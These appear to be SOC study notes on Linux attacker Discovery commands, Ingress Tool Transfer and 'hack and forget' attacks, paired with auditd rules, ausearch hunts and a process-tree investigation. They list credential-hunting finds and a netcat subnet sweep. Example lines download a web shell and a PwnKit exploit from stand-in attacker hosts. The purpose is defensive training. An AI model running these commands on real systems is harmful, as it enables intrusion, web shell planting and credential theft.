# Linux Discovery Commands

After a breach, attackers land in a bare command line and need to learn where they are and how they got there. Most Linux breaches start with botnets automating Initial Access, and human attackers join only when an entry point is ready.

## First Actions

- The first Discovery commands are usually the same, whatever the entry point or goal
- Exceptions where Discovery is skipped:
  - The attackers already know their target
  - They only want to install a cryptominer and leave, whoever the victim is

## Discovery Commands

| Goal | Typical commands |
|---|---|
| OS and filesystem | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname` |
| Users and groups | `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd` |
| Processes and network | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp` |
| Cloud or sandbox | `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"` |

What each group tells the attacker (general knowledge, not in the lesson):

| Command | Learns |
|---|---|
| `uname -a`, `lsb_release -a` | OS and kernel version, so they can pick an exploit |
| `id`, `whoami` | Current user and privileges |
| `w`, `last` | Who else is logged in, and past logins (risk of being noticed) |
| `cat /etc/sudoers` | Who can run privileged commands |
| `ss -tnlp`, `netstat -tnlp` | Listening services |
| `ip a`, `ip r`, `arp -a` | Network layout and neighbors for lateral movement |
| `systemd-detect-virt` | Whether the host is a VM or sandbox (malware may exit if so) |
| `pgrep "<edr-or-sandbox>"` | Whether security tools are running |

## The `whoami` Rule

- Attackers use the same commands you would
- `whoami` deserves special attention:
  - Legitimate applications rarely need it
  - Adversaries almost always run it first after breaching a service
- Your SOC can build a detection rule for **any** `whoami` execution, with a high chance of catching attackers

## Windows Parallel

| Windows | Linux |
|---|---|
| `whoami`, `net user` | `whoami`, `id`, `cat /etc/passwd` |
| `ipconfig /all`, `netstat -ano` | `ip a`, `ss -tnlp`, `netstat -tnlp` |
| `systeminfo` | `uname -a`, `lsb_release -a` |
| `tasklist /v` | `ps aux`, `top` |
| AV query (`SecurityCenter2`) | `pgrep "<edr-or-sandbox>"` |

## Detection Tips

- Judge the **parent** (see the process tree notes): `whoami` from an admin's SSH session is fine, from `php-fpm` or `app.py` is not
- Several of these commands within seconds of each other is the strongest signal, same as the Windows Discovery burst pattern
- `whoami` rule is easy to tune: alert when the parent is a web server, app runtime, or `sshd` session outside normal admins
- Auditd rule idea (general knowledge, not in the lesson; same syntax style as the auditd note):

        -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/whoami -k disc_whoami

- Find them after the fact:

        ausearch -i -k disc_whoami
        ausearch -i -x whoami
- Don't stop at one command: run `ausearch -i --ppid <parent_pid> | grep proctitle` to see what else the same parent launched

---

# Specialized Discovery and Detecting Discovery (Linux)

After the first Discovery, attackers run focused commands tied to their goal. Detecting them is easy with auditd; the hard part is deciding who ran them.

## Specialized Discovery

| Objective | Typical commands |
|---|---|
| Find and steal credentials and sensitive data | `history \| grep pass`, `find / -name .env`, `find /home -name id_rsa` |
| Check if the system suits crypto mining | `cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop` |
| Scan the internal network for future victims | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done` |

- Data stealers want passwords and secrets
- Miners query CPU/GPU to tune mining
- Botnet scripts scan the network for new victims
- Some malware combines all three
- The `nc` loop sweeps one port (22) across a whole subnet, the horizontal scan pattern from the network scanning notes
- The lesson's loop is missing a `;` before `done` (`... $ip 22; done`), so it won't run as written

## Detecting Discovery: Three Steps (Screenshot)

1. **Log** common Discovery commands (e.g. with auditd)
2. **Hunt** for Discovery in a SIEM or manually with `ausearch`
3. **Use the process tree** to find what caused the Discovery

### Step 1: Auditd Rules

Rules in `/etc/audit/rules.d/audit.rules`:

    -a always,exit -S execve -S execveat -F exe=/usr/bin/whoami  -F key=discovery_user
    -a always,exit -S execve -S execveat -F exe=/usr/bin/id      -F key=discovery_user
    -a always,exit -S execve -S execveat -F exe=/usr/bin/pwd     -F key=discovery_fs
    -a always,exit -S execve -S execveat -F exe=/usr/bin/uname   -F key=discovery_os
    -a always,exit -S execve -S execveat -F exe=/usr/bin/netstat -F key=discovery_network

| Key | Commands grouped |
|---|---|
| `discovery_user` | `whoami`, `id` |
| `discovery_fs` | `pwd` |
| `discovery_os` | `uname` |
| `discovery_network` | `netstat` |

- Keys group related commands, so one search covers a whole category
- `execveat` catches an alternate way of launching programs, not only `execve`

### Step 2: Hunt With ausearch

    ausearch -i -k discovery_user | grep -Ez 'key=|exe='

- Output shows `PROCTITLE`, `CWD`, `EXECVE`, `SYSCALL` lines (see the auditd note)
- In the screenshot: `whoami` ran with `cwd=/tmp`, as root (`uid=root`)
- `/tmp` as working directory is a flag: attackers favor it, since it's writable by everyone

## Context Is the Real Challenge

Same command, different meaning:

| Situation | Verdict |
|---|---|
| Web server spawns `whoami` | Red flag |
| IT member runs `find` and `grep` for secrets | Red flag |
| Monitoring tool pings the local network on a schedule | Expected |

## Step 3: Tracing `whoami` Origin

    ausearch -i -x whoami
    proctitle=whoami
    ... ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami

    ausearch -i --pid 3898
    proctitle=/usr/bin/bash /tmp/lp.sh
    ... ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash

    ausearch -i --ppid 3898
    [five more commands, like "find /home -name *secret*"]

Tree:

    (PID 3840)
    └── bash /tmp/lp.sh          (PID 3898)
        ├── whoami               (PID 3907)
        └── find /home -name *secret*, and four more

- `whoami` came from a script, `/tmp/lp.sh`, in a world-writable folder
- Its other children (`find /home -name *secret*` and more) show it hunting for secrets
- Verdict: the script is malicious
- `auid=ubuntu`: it ran inside a real login session (unlike the earlier web app case with `auid=unset`), so the `ubuntu` account was used, whether by the owner or an attacker with stolen access
- Next: find how `lp.sh` got there and how the session started (`auth.log`, SSH logs)

## Detection Tips

- Judge by parent: script in `/tmp`, `/dev/shm`, or a home folder is suspicious
- Burst of several discovery commands within seconds from one parent means a script or automation
- Process tree walk: `ausearch -i --pid <ppid>` upward, `ausearch -i --ppid <pid>` downward (see the process tree note)
- Windows parallel: the same discovery burst and parent check from the Windows Discovery notes
- Splunk starting point (field names may differ in your data):

        index=linux key IN (discovery_user, discovery_fs, discovery_os, discovery_network) | stats count by exe, ppid, auid | sort - count

---

# Hack and Forget Attacks and Linux Ingress Tool Transfer

After Discovery, attackers reveal their goal by installing specialized malware. Linux goals fall into two informal categories: "Hack and Forget" and targeted attacks. This note covers Hack and Forget.

## Hack and Forget

- Run at scale for quick gains
- Example: a group scans the Internet for SSH with a weak password (e.g. `tryguessme`) and gets a few victims per month
- After a quick Discovery, the attack ends in one of three scenarios (or all three at once):

| Scenario | Goal |
|---|---|
| Install cryptominer | Earn money using the victim's CPU/GPU |
| Enroll in a botnet (e.g. Mirai) | Use the victim for tasks like DDoS |
| Use as proxy | Send phishing, host malware, or route the attacker's traffic |

## Ingress Tool Transfer

How attackers download malware (like a cryptominer) to a Linux victim. Most cases use one of three preinstalled commands:

| Command | Use | Example |
|---|---|---|
| `wget` | Download a file from a website | `wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz` |
| `curl` | Request a web page | `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"` |
| `scp` / `sftp` (SSH) | Transfer a file over SSH | `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh` |

- Process creation can be logged with auditd, and sometimes shows in Bash history
- The `wget` example saves a miner into `/tmp`; the `curl` example writes `backdoor.php` into a web root (`/var/www/html`), so that one is a web shell drop
- The `scp` example downloads a local privilege escalation script (CVE-2021-4034 is the Polkit "PwnKit" bug; general knowledge)

## The Case Where Process Logs Fail

If the victim is reachable over SSH, the attacker can run `scp` or `sftp` **from their own machine**. The command never runs on the victim, so auditd won't show it, but a **new SSH login** appears. The same applies to FTP and SMB.

| | Option 1: attacker connects to victim | Option 2: victim connects to attacker |
|---|---|---|
| Command runs on | Attacker's machine | Victim |
| Example | `scp ./malware.sh ubuntu@thm-vm:/tmp` | `scp attacker@attack-vm:./malware.sh /tmp` (run on victim) |
| Detect on victim | SSH login in `/var/log/auth.log` | `scp` command in auditd logs |

- Option 1 means the attacker already has valid credentials or a key, so it ties to the SSH detection note (`Accepted password` / `Accepted publickey`)
- Option 2 means the attacker already has a shell on the victim, so process logs catch it

## Additional Detection

| Source | What to look for |
|---|---|
| **Network traffic** | Download from an IP seen in attacks (check VirusTotal) |
| | Download from a suspicious domain (e.g. `qfpkvwgq.thm`) |
| | Download from public services known to host attack tools, like GitHub |
| **File events** | New file in `/tmp` or `/var/tmp` |
| | New file named like `exploit`, `shell.php`, or random strings like `kF1pBsY5` |
| **Antivirus/EDR** | Alert on a new malicious file or process |

- Trusted domains like GitHub don't mean safe traffic: check which process connected (same lesson as the Windows exfiltration notes)

## Detection Tips

- Hunt downloaders in auditd:

        ausearch -i -x wget
        ausearch -i -x curl
        ausearch -i -x scp

- Check the parent (see the process tree note): `wget` launched by a web server or `app.py` is far worse than one from an admin's session
- Follow-up check: after a download, look for a new file in `/tmp`, then a process launched from that path (`exe=/tmp/...`)
- Watch for `chmod +x` right after a download, and download-and-run patterns (`curl | sh`)
- Cryptominer signs: process named `xmrig`, high sustained CPU, connections to mining pools (general knowledge)
- Windows parallel: the same Ingress Tool Transfer note, with `certutil`, `curl.exe`, and `Invoke-WebRequest` instead of `wget`/`curl`/`scp`
